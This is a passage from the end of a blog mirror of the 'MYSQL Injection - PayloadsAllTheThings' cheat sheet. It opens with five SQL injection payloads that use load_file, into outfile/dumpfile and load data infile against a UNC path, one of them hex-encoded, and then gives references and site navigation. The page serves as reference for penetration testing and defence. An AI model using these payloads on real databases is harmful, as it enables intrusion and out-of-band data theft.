</pre></td><td class="rouge-code"><pre><span class="k">select</span> <span class="n">load_file</span><span class="p">(</span><span class="s1">'</span><span class="se">\\\\</span><span class="s1">error</span><span class="se">\\</span><span class="s1">abc'</span><span class="p">);</span>
<span class="k">select</span> <span class="n">load_file</span><span class="p">(</span><span class="mi">0</span><span class="n">x5c5c5c5c6572726f725c5c616263</span><span class="p">);</span>
<span class="k">select</span> <span class="s1">'osanda'</span> <span class="k">into</span> <span class="n">dumpfile</span> <span class="s1">'</span><span class="se">\\\\</span><span class="s1">error</span><span class="se">\\</span><span class="s1">abc'</span><span class="p">;</span>
<span class="k">select</span> <span class="s1">'osanda'</span> <span class="k">into</span> <span class="n">outfile</span> <span class="s1">'</span><span class="se">\\\\</span><span class="s1">error</span><span class="se">\\</span><span class="s1">abc'</span><span class="p">;</span>
<span class="k">load</span> <span class="k">data</span> <span class="n">infile</span> <span class="s1">'</span><span class="se">\\\\</span><span class="s1">error</span><span class="se">\\</span><span class="s1">abc'</span> <span class="k">into</span> <span class="k">table</span> <span class="k">database</span><span class="p">.</span><span class="k">table_name</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="references">References</h2>

<ul>
  <li><a href="https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf">MySQL Out of Band Hacking - @OsandaMalith</a></li>
  <li><a href="https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/">[Sqli] Extracting data without knowing columns names - Ahmed Sultan @0x4148</a></li>
  <li><a href="https://rdot.org/forum/showpost.php?p=114&amp;postcount=1">Help по MySql инъекциям - rdot.org</a></li>
  <li><a href="https://resources.infosecinstitute.com/sql-truncation-attack/">SQL Truncation Attack - Warlock</a></li>
  <li><a href="https://hackerone.com/reports/508123">HackerOne @ajxchapman 50m-ctf writeup - Alex Chapman @ajxchapman</a></li>
  <li><a href="https://sqlwiki.netspi.com/injectionTypes/errorBased">SQL Wiki - netspi</a></li>
  <li><a href="https://github.com/p4-team/ctf/tree/master/2016-10-26-ekoparty/web_100">ekoparty web_100 - 2016/10/26 - p4-team</a></li>
  <li><a href="https://websec.ca/kb/sql_injection#MySQL_Default_Databases">Websec - MySQL - Roberto Salgado - May 29, 2013.</a></li>
</ul>


      </div>

      <div class="post-tail-wrapper text-muted">

        <!-- categories -->
        
        <div class="post-meta mb-3">
          <i class="far fa-folder-open fa-fw mr-1"></i>
          
            <a href='/categories/database/'>Database</a>,
            <a href='/categories/mysql/'>MYSQL</a>
        </div>
        

        <!-- tags -->
        
        <div class="post-tags">
          <i class="fa fa-tags fa-fw mr-1"></i>
          
          <a href="/tags/injection/"
            class="post-tag no-text-decoration" >Injection</a>
          
          <a href="/tags/database/"
            class="post-tag no-text-decoration" >Database</a>
          
          <a href="/tags/mysql/"
            class="post-tag no-text-decoration" >MYSQL</a>
          
          </div>
        

        <div class="post-tail-bottom
          d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
          
          <div class="license-wrapper">
            This post is licensed under
            <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>
            by the author.
          </div>
          

          <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=MYSQL Injection - PayloadsAllTheThings&url=http://localhost:4000/MySQL-Injection/" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=MYSQL Injection - PayloadsAllTheThings&u=http://localhost:4000/MySQL-Injection/" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://telegram.me/share?text=MYSQL Injection - PayloadsAllTheThings&url=http://localhost:4000/MySQL-Injection/" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i class="fa-fw fas fa-link small" onclick="copyLink()"
        data-toggle="tooltip" data-placement="top" title="Copy link"></i>

  </span>
</div>


        </div><!-- .post-tail-bottom -->

      </div><!-- div.post-tail -->

    </div> <!-- .post -->


  </div> <!-- #post-wrapper -->

  

  

  <!--
  The Pannel on right side (Desktop views)
-->

<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

  <div class="access">

  














  

  















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



  
    <div id="access-tags">
      <span>Trending Tags</span>
      <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

      
        
        <a class="post-tag" href="/tags/injection/">Injection</a>
      
        
        <a class="post-tag" href="/tags/database/">Database</a>
      
        
        <a class="post-tag" href="/tags/server/">Server</a>
      
        
        <a class="post-tag" href="/tags/network/">Network</a>
      
        
        <a class="post-tag" href="/tags/windows/">Windows</a>
      
        
        <a class="post-tag" href="/tags/exploits/">Exploits</a>
      
        
        <a class="post-tag" href="/tags/shell/">Shell</a>
      
        
        <a class="post-tag" href="/tags/sql/">SQL</a>
      
        
        <a class="post-tag" href="/tags/xss/">XSS</a>
      
        
        <a class="post-tag" href="/tags/attack/">Attack</a>
      

      </div>
    </div>
  
  </div> <!-- .access -->

  
    <!-- BS-toc.js will be loaded at medium priority -->
    <script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>
    <div id="toc-wrapper" class="pl-0 pr-4 mb-5">
      <span class="pl-3 pt-2 mb-2">Contents</span>
      <nav id="toc" data-toggle="toc"></nav>
    </div>
  

</div> <!-- #panel-wrapper -->


</div> <!-- .row -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

    <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->






  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/HQL-Injection/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Oct 29, 2019
  

  <i class="unloaded">2019-10-29T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>HQL Injection</h3>
            <div class="text-muted small">
              <p>
                





                Hibernate Query Language Injection


  Hibernate ORM (Hibernate in short) is an object-relational mapping tool for the Java programming language. It provides a framework for mapping an object-orien...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/NoSQL-Injection/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    May 24, 2020
  

  <i class="unloaded">2020-05-24T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>NoSQL Injection</h3>
            <div class="text-muted small">
              <p>
                





                
  NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance ...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/Cassandra-Injection/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Oct  9, 2020
  

  <i class="unloaded">2020-10-09T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Cassandra Injection</h3>
            <div class="text-muted small">
              <p>
                





                Cassandra Injection


  Apache Cassandra is a free and open-source distributed wide column store NoSQL database management system


Summary


  Cassandra comment
  Cassandra - Login Bypass
    
   ...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->



    <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/Insecure-Management-Interface/" class="btn btn-outline-primary"
    prompt="Older">
    <p>Insecure Management Interface</p>
  </a>
  

  
  <a href="/SQLite-Injection/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>SQLite Injection</p>
  </a>
  

</div>


    

    </div> <!-- #post-extend-wrapper -->

  </div> <!-- .col-* -->

</div> <!-- .row -->



        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center">
    <div class="footer-left">
      <p class="mb-0">
        © 2022
        <a href="https://twitter.com/Zxce3_">Zxce3</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        Powered by
        <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
        with
        <a href="https://github.com/cotes2020/jekyll-theme-chirpy"
          target="_blank" rel="noopener">Chirpy</a>
        theme.
      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      <h4 class="text-muted mb-4">Trending Tags</h4>

      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



      
        
        <a class="post-tag" href="/tags/injection/">Injection</a>
      
        
        <a class="post-tag" href="/tags/database/">Database</a>
      
        
        <a class="post-tag" href="/tags/server/">Server</a>
      
        
        <a class="post-tag" href="/tags/network/">Network</a>
      
        
        <a class="post-tag" href="/tags/windows/">Windows</a>
      
        
        <a class="post-tag" href="/tags/exploits/">Exploits</a>
      
        
        <a class="post-tag" href="/tags/shell/">Shell</a>
      
        
        <a class="post-tag" href="/tags/sql/">SQL</a>
      
        
        <a class="post-tag" href="/tags/xss/">XSS</a>
      
        
        <a class="post-tag" href="/tags/attack/">Attack</a>
      

    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="http://localhost:4000{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


  </body>

</html>

